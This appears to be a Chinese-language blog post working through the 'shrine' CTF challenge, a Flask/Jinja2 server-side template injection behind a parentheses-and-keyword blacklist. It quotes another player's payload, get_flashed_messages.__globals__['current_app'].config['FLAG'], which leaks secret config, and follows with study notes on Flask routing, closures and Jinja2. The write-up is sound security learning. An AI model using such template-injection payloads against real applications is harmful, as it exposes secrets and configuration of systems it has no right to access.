---
layout: post
title: Web进阶题-shrine
excerpt: "攻防世界进阶Web题目-shrine"
date:   2020-10-25 09:35:00
categories: [CTF]
comments: true
---

## 我的解题过程

1. 访问目标网站，返回内容如下

   ```python
   
   import flask
   import os
   
   #创建Flask实例，参数为应用模块的名字
   app = flask.Flask(__name__)
   
   #
   app.config['FLAG'] = os.environ.pop('FLAG')
   
   #将/目录的请求绑定到index函数，返回当前文件源码
   @app.route('/')
   def index():
       return open(__file__).read()
   
   #将/shrine/<path:shrine>绑定到shrine函数，并将路径中的值经过path转换器修饰之后赋值给shrine函数作为参数
   @app.route('/shrine/<path:shrine>')
   def shrine(shrine):
   	#用来过滤用户传来的shrine字符串
       def safe_jinja(s):
           #将‘(’和‘)’删除，避免了直接通过os模块获取flag
           s = s.replace('(', '').replace(')', '')
           #设置黑名单，config、self
           blacklist = ['config', 'self']
           #用\{\% set config=None\%\}\{\% set self=None\%\}拼接之前过滤到()的字符串
           return ''.join(['\{\{\% set \{\}=None\%\}\}'.format(c) for c in blacklist]) + s
   
       #渲染
       return flask.render_template_string(safe_jinja(shrine))
   
   
   if __name__ == '__main__':
       app.run(debug=True)
   
   ```
   
2. 在本地编写Flask测试屏蔽掉的config的作用

   * 测试代码

     ```python
     import flask
     import os
     
     #创建Flask实例，参数为应用模块的名字
     app = flask.Flask(__name__)
     
     #新增配置
     app.config['FLAG'] = 23333
     
     @app.route('/test/<path:shrine>')
     def test(shrine):
         return flask.render_template_string(shrine)
     
     if __name__ == '__main__':
         app.listen(2333)
         app.run(debug=True)
        
     ```
     
   * 访问本地网络，"http://127.0.0.1:2333/test/\{\{config\}\}"，返回内容如下

     ```python
     < Config {
        	'ENV': 'production',
        	'DEBUG': True,
        	'TESTING': False,
        	...........
        	...........
        	'MAX_COOKIE_SIZE': 4093,
        	'FLAG': 23333
        } >
     ```
   
   * 所以屏蔽掉的config其实是访问到flag的


3. 在网上检索Jinja2执行时上下文中有哪些存在的对象
   * 请求对象request，从它本身和它继承的类中的所有方法中没有找到可以利用的
   * 会话对象session，在本题中session为空
   * 全局对象g
   * 配置对象config，由于黑名单新生成了一个成员变量config为空，导致访问config时访问到成员变量而不是全局变量
4. 由于path转换器支持斜杠，所以尝试目录遍历
5. ...........
6. 没做出来

## 别人的解法

1. 访问'/shrine/\{\{get\_flashed\_messages.\_\_globals\_\_\}\}'，网页返回内容为

   ```json
   {
   	..............
   	'current_app': < Flask 'app' > ,
   	..............
   	'io': < module 'io' from '/usr/local/lib/python2.7/io.pyc' > ,
   	'get_flashed_messages': < function get_flashed_messages at 0x7f4f8950ed70 > ,
   	..............
   	'__package__': 'flask',
   	'locked_cached_property': < class 'flask.helpers.locked_cached_property' > ,
   	'_app_ctx_stack': < werkzeug.local.LocalStack object at 0x7f4f8953e750 > ,
   	..............
   	'get_template_attribute': < function get_template_attribute at 0x7f4f8950ec80 > ,
   	'_request_ctx_stack': < werkzeug.local.LocalStack object at 0x7f4f89533290 > ,
   	..............
   	'sys': < module 'sys' (built - in ) > ,
   	'Headers': < class 'werkzeug.datastructures.Headers' > ,
   	'stream_with_context': < function stream_with_context at 0x7f4f8950eb18 > ,
   	'_os_alt_seps': [],
   	'__name__': 'flask.helpers',
   	..............
   	'url_for': < function url_for at 0x7f4f8950ec08 > ,
   	..............
   	'os': < module 'os'from '/usr/local/lib/python2.7/os.pyc' >
   }
   ```
   
2. 看到这一步基本这道题就明白了，因为这里面返回了current_app对象，而这个对象是全局的，指向当前app的对象

3. "/shrine/\{\{get_flashed_messages.\_\_globals\_\_\['current_app'\].config\['FLAG'\]\}\}"，网页返回内容如下

   ```py
   flag{shrine_is_good_ssti}
   ```

4. 发现flag，flag{shrine_is_good_ssti}

5. 提交，答案正确

## 独立思考

### 1. Flask框架路由的变量规则有哪些？

* 默认传参：通过把 URL 的一部分标记为 \<variable_name\> 就可以在 URL 中添加变量。标记的 部分会作为关键字参数传递给函数。

  ```python
  @app.route('/user/<username>')
  def show_user_profile(username):
      # show the user profile for that user
      return 'User %s' % escape(username)
  ```

* 转换器修饰传参：通过使用 \<converter:variable_name\> ，可以选择性的加上一个转换器，为变量指定规则。

  ```python
  @app.route('/path/<path:subpath>')
  def show_subpath(subpath):
      # show the subpath after /path/
      return 'Subpath %s' % escape(subpath)
  ```

| string | （缺省值） 接受任何不包含斜杠的文本 |
| ------ | ----------------------------------- |
| int    | 接受正整数                          |
| float  | 接受正浮点数                        |
| path   | 类似 string，但**可以包含斜杠**     |
| uuid   | 接受 UUID 字符串                    |

### 2. Python的函数机制有哪些？

1. 嵌套函数

   Python允许创建嵌套函数，也就是说可以在函数里面定义函数，而现有的作用域和变量生存周期不变。

   ```python
   @app.route('/shrine/<path:shrine>')
   def shrine(shrine):
   
       def safe_jinja(s):
           s = s.replace('(', '').replace(')', '')
           blacklist = ['config', 'self']
           return ''.join(['\{\{\% set \{\}=None\%\}\}'.format(c) for c in blacklist]) + s
   
       return flask.render_template_string(safe_jinja(shrine))
   ```

2. 函数传递

   在Python中函数就是对象，可以把函数像参数一样传递给其他的函数，或者从函数里面返回函数。

   * 函数示例1：最终打印"python"

     ```python
     def outer():
         name="python"
     
         def inner():
             return name
         
         return inner()
     
     print outer()
     ```

   * 函数示例2：最终打印"\<function outer.\<locals\>.inner at 0x00000240DDC39840\>"

     ```python
     def outer():
         name="python"
     
         def inner():
             return name
         
         return inner
     
     print outer()
     ```

   * 函数示例3：最终打印"3"

     ```python
     def add(x,y):
         return x+y
     
     def apply(func,x,y):
         return func(x,y)
     
     print(apply(add,1,2))
     ```

3. 函数闭包

   * 如果一个函数定义在另一个函数的作用域内，并且引用了外层函数的变量，则该函数及这些被引用的外围变量一起构成闭包。
   * 每次调用外部函数返回内部函数时，都返回的是闭包，而不仅仅是内部函数，这样它每次都会读取都**生成该闭包时**的外围变量。每次调用。
   * 每次调用外部函数返回内部函数时，都返回的是新被定义的闭包，因为每次调用外围函数返回内部函数闭包时的外围变量不一定一样。

### 3. Jinja2对于\{\% \%\}里的值如何处理？

在Jinja2中存在三种语法：

* 控制结构\{\% \%\}

  * for循环

    ```jinja2
    <ul>
    \{\% for user in users \%\}
    <li>\{\{ user.username|title \}\}</li>
    \{\% endfor \%\}
    </ul>
    ```

  * 宏

    ```jinja2
    \{\% macro input(name,age=18) \%\}   # 参数age的默认值为18
     
     <input type='text' name="\{\{ name \}\}" value="\{\{ age \}\}" >
     
    \{\% endmacro \%\}
    ```

  * 父模板

    ```jinja2
    <head>
        \{\% block head \%\}
        <link rel="stylesheet" href="style.css"/>
        <title>\{\% block title \%\}\{\% endblock \%\} - My Webpage</title>
        \{\% endblock \%\}
    </head>
    ```

  * 继承和模板修改

    ```jinja2
    \{\% extend "test.html" \%\}       # 继承test.html文件
     
    \{\% block title \%\} Test \{\% endblock \%\}   # 定制title部分的内容
     
    \{\% block head \%\}
        \{\{  super()  \}\}        # 用于获取原有的信息
        <style type='text/css'>
        .important { color: #FFFFFF }
        </style>
    \{\% endblock \%\} 
    
    #未修改的使用父模板的内容
    ```

* 变量取值\{\{\}\}

* 注释\{\# \#\}

### 4. 本题为什么黑名单还要禁用self？

* self：指向当前类的实例
* 本题中我在本地搭建的环境中尝试了self，访问"/test/\{\{self\}\}"但返回的只是一个"\<TemplateReference None\>"，没有可利用的点
* **还是不明白本题为什么要禁用self**

### 5. Jinja2执行时上下文中有哪些存在的对象？

* config：当前配置对象
* request：当前请求对象
* session：当前会话对象
* g：请求绑定的全部变量
* url_for()：flask.url()函数
* get_flashed_messages()：flask.get_flasked_message()函数

```python
def create_jinja_environment(self):
    """Create the Jinja environment based on :attr:`jinja_options`
        and the various Jinja-related methods of the app. Changing
        :attr:`jinja_options` after this will have no effect. Also adds
        Flask-related globals and filters to the environment.

        .. versionchanged:: 0.11
           ``Environment.auto_reload`` set in accordance with
           ``TEMPLATES_AUTO_RELOAD`` configuration option.

        .. versionadded:: 0.5
        """
    options = dict(self.jinja_options)

    if "autoescape" not in options:
        options["autoescape"] = self.select_jinja_autoescape

        if "auto_reload" not in options:
            options["auto_reload"] = self.templates_auto_reload

            rv = self.jinja_environment(self, **options)
            rv.globals.update(
                #传入url_for函数对象
                url_for=url_for,
                #传入get_flashed_messages函数对象
                get_flashed_messages=get_flashed_messages,
                #传入flask的config
                config=self.config,
                # request, session and g are normally added with the
                # context processor for efficiency reasons but for imported
                # templates we also want the proxies in there.
                #传入此次请求的request对象
                request=request,
                #传入此次请求的session对象
                session=session,
                #传入此次请求绑定的全局变量列表
                g=g,
            )
            rv.filters["tojson"] = json.tojson_filter
            return rv
```

### 6. 为什么\_\_globals\_\_可以导出这么多信息？

#### 问题成因

* 别人的解题时查看了get\_flashed\_messages.\_\_globals\_\_，导出了大量模块
* 我在解题时由于忽视了url_for和get_flashed_messages函数而且config对象被拉了黑名单，所以主要查看了session、request、g的\_\_globals\_\_，但导出为空

#### 查看get_flashed_messages源码

在框架源码中查到get_flashed_messages，最终定位在helpers.py

```python
def get_flashed_messages(with_categories=False, category_filter=()):
    """Pulls all flashed messages from the session and returns them.
    Further calls in the same request to the function will return
    the same messages.  By default just the messages are returned,
    but when `with_categories` is set to ``True``, the return value will
    be a list of tuples in the form ``(category, message)`` instea

    :param with_categories: set to ``True`` to also receive categories.
    :param category_filter: whitelist of categories to limit return values
    """
    flashes = _request_ctx_stack.top.flashes
    if flashes is None:
        _request_ctx_stack.top.flashes = flashes = (
            session.pop("_flashes") if "_flashes" in session else []
        )
    if category_filter:
        flashes = list(filter(lambda f: f[0] in category_filter, flashes))
    if not with_categories:
        return [x[1] for x in flashes]
    return flashes
```

可以看出该函数十分简单，那它是怎么导出os、sys等模块的呢？

发现该函数所在的helpers.py文件import的部分有如下内容

```python
import io
import mimetypes
import os
import pkgutil
import posixpath
import socket
import sys
import unicodedata
from functools import update_wrapper
from threading import RLock
from time import time
from zlib import adler32

from jinja2 import FileSystemLoader
from werkzeug.datastructures import Headers
from werkzeug.exceptions import BadRequest
from werkzeug.exceptions import NotFound
from werkzeug.exceptions import RequestedRangeNotSatisfiable
from werkzeug.routing import BuildError
from werkzeug.urls import url_quote
from werkzeug.wsgi import wrap_file

from ._compat import fspath
from ._compat import PY2
from ._compat import string_types
from ._compat import text_type
from .globals import _app_ctx_stack
from .globals import _request_ctx_stack
from .globals import current_app
from .globals import request
from .globals import session
from .signals import message_flashed
```

所以python文件中包裹在类内的函数调用\_\_globals\_\_方法会返回该文件中导入的所有模块

#### 查看\_\_globals\_\_函数的相关文档

\_\_globals\_\_返回一个保存函数全局变量的字典的引用，所以当对类或者对象执行该魔术方法不会返回内容

## 产生过的疑问

1. Flask框架路由的变量规则有哪些？
2. Python的函数机制有哪些？
3. Jinja2对于\{\% \%\}里的值如何处理？
4. 本题为什么黑名单还要禁用self？
5. Jinja2执行时上下文中有哪些存在的对象？
6. 为什么\_\_globals\_\_可以导出这么多信息？

